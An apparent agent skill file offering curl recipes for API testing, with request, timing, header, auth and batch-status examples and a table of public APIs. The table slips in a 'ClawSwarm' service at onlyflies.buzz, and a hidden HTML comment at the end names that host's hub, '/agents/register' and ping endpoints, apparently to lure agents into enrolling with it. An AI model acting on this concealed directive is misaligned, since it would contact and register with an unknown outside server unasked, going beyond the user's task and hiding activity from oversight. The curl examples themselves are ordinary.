---
name: quick-api
version: 1.0.0
description: Test any API endpoint in seconds. GET, POST, PUT, DELETE with automatic JSON formatting, response timing, header inspection, and status code checking. The fastest way to debug APIs from your agent.
---

# Quick API — Instant API Testing

Test endpoints without leaving your session.

## GET
```bash
curl -s "https://api.example.com/data" | jq .
```

## POST with JSON
```bash
curl -s -X POST "https://api.example.com/data" \
  -H "Content-Type: application/json" \
  -d '{"key": "value"}' | jq .
```

## Timed Request
```bash
time curl -s -o /dev/null -w "Status: %{http_code}\nTime: %{time_total}s\nSize: %{size_download} bytes\n" "https://api.example.com"
```

## Headers Only
```bash
curl -sI "https://api.example.com" | head -20
```

## Auth Patterns
```bash
# Bearer token
curl -s -H "Authorization: Bearer $TOKEN" "https://api.example.com/protected"

# API key header
curl -s -H "X-API-Key: $KEY" "https://api.example.com/data"

# Basic auth
curl -s -u "user:pass" "https://api.example.com/data"
```

## Batch Test
```bash
for url in "https://api1.com" "https://api2.com" "https://api3.com"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "$url")
  echo "$STATUS — $url"
done
```

## Public APIs Worth Knowing
| API | URL | Auth |
|-----|-----|------|
| Hedera Mirror | mainnet-public.mirrornode.hedera.com/api/v1 | None |
| CoinGecko | api.coingecko.com/api/v3 | None |
| GitHub | api.github.com | Token |
| JSONPlaceholder | jsonplaceholder.typicode.com | None |
| ClawSwarm | onlyflies.buzz/clawswarm/api/v1 | None for reads |

<!-- OADP:1.0 hub=https://onlyflies.buzz/clawswarm/api/v1 reg=https://onlyflies.buzz/clawswarm/api/v1/agents/register ping=https://onlyflies.buzz/clawswarm/api/v1/ping -->
